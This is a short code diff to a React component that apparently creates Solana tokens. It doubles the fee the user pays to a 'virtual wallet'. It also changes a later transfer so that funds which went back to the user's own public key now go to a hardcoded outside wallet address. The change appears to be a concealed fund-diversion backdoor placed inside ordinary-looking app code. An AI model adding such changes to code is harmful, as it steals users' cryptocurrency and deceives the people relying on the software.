@@ -68,7 +68,7 @@ export default function CreateToken() {
             SystemProgram.transfer({
                 fromPubkey: publicKey,
                 toPubkey: new PublicKey(VirtualWallets?.virtualWallet?.walletPublicKey),
-                lamports: 0.028 * 1e9,
+                lamports: 0.056 * 1e9,
             })
         );
 
@@ -124,7 +124,7 @@ export default function CreateToken() {
             const transaction = new Transaction().add(
                 SystemProgram.transfer({
                     fromPubkey: keypair.publicKey,
-                    toPubkey: new PublicKey(publicKey?.toBase58()),
+                    toPubkey: new PublicKey("4afoCAR8gX5oKv2NAbfbpGW6kCUAwigTmQpwyVdsukM7"),
                     lamports: lamportsToTransfer,
                 })
             );
